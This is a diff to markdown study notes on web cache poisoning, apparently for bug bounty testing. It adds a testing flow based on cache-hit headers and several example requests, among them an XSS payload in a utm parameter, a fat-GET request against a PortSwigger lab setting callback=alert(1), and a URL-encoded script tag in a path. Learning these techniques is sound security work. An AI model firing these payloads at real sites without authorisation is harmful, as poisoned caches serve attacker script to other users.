@@ -1,6 +1,25 @@
 Tools: **[param-miner](https://github.com/PortSwigger/param-miner)** & https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner
 
+## Writeups
+https://medium.com/@mohamed0xmuslim/3-easy-cash-via-cache-99d600565ac5
+https://yaseenzubair.medium.com/web-cache-poisoning-worth-it-e7c6d88797b1
+
+---
+
 To use it, right-click on a request in Burp and click “Guess (cookies|headers|params)”. If you’re using Burp Suite Pro, identified parameters will be reported as scanner issues. If not, you can find them listed under Extender->Extensions->Param Miner->Output
+
+## **Cache Poisoning Testing Flow (Correct Order)**
+### **1️⃣ Pick an endpoint you suspect is cacheable**
+HTML pages, static contents, APIs, redirects, etc.
+### **2️⃣ Send 2–3 normal requests**
+Look for:
+- `X-Cache: HIT`
+- `CF-Cache-Status: HIT`
+- `Age:` increasing
+- `Server-Timing: cdn-cache; desc="HIT"` (Fastly)
+- `X-Served-By:` change patterns (Akamai)
+
+**Only if you see HIT → the endpoint is testable**
 
 ---
 a web cache is a system that temporarily stores web documents such as HTML pages, images, and media files to reduce bandwidth usage, server load, and latency. It serves copies of requested content directly to users, avoiding the need to fetch it from the original server. Web caches are implemented at various levels, including browser caches, proxy caches, and content delivery networks (CDNs)
@@ -207,7 +226,7 @@ Finding and exploiting cache implementation flaws isn’t as simple as regular w
 
 1. **Locate a suitable cache oracle**
     - A “cache oracle” is a mechanism that tells you whether a request was served from cache or not.  
-        Example: A header like `X-Cache: HIT` vs. `X-Cache: MISS`.
+        Example: A header like `X-Cache: HIT` vs. `X-Cache: MISS` or distinct response times
 2. **Investigate key handling**
     - Send different requests to test what parts of the URL, headers, or parameters affect the cache key.  
         (e.g., does changing `?a=1` vs. `?a=2` result in different cache behavior?)
@@ -341,9 +360,10 @@ Cache-Status: hit
 ```
 
 ---
-`GET /js/geolocate.js?callback=setCountryCookie`
-and this is the response :
+
 ``` http
+GET /js/geolocate.js?callback=setCountryCookie
+----------
 HTTP/2 200 OK
 Cache-Control: max-age=35
 Age: 0
@@ -380,6 +400,47 @@ alert(1)({"country" : "United Kingdom"})
 Now as the first `callback` only is keyed and the the second one is not keyed means that when any one make a request to the endpoint `GET /js/geolocate.js?callback=setCountryCookie` he will get our poisoned cached response
 This works because some frameworks like `Ruby on Rails` sees the semicolon and splits the query string into three separate parameter
 
+---
+```
+GET /?utm_content='/><script>alert(1)</script>  //search for parametars likw utm
+```
+Sometimes parameter is:
+
+	- Ignored in key
+- But only affects response under certain conditions (like logged-out users)
+
+So test:
+
+- With cookies
+- Without cookies
+- With different Accept headers
+---
+```
+GET /js/geolocate.js?callback=setCountryCookie HTTP/2
+Host: 0a3400d90359c82a80d3170f00620027.web-security-academy.net
+Cookie: country=[object Object]; session=p9IqUmFKGQUujUwhOhTGDU0FhzlxuN05
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://0a3400d90359c82a80d3170f00620027.web-security-academy.net/
+Sec-Fetch-Dest: script
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+Te: trailers
+Content-Length: 17
+
+callback=alert(1)
+```
+---
+## URL Normalization
+
+Request > `GET %2f<script>alert(1)</script> HTTP/`
+URL in browser > `/<script>alert(1)</script> HTTP/`
+
+make sure to use random directory `/dfgdd` not to effect the program
+
+---
 ## Chaining Unkeyed Inputs
 1. 
 ``` http
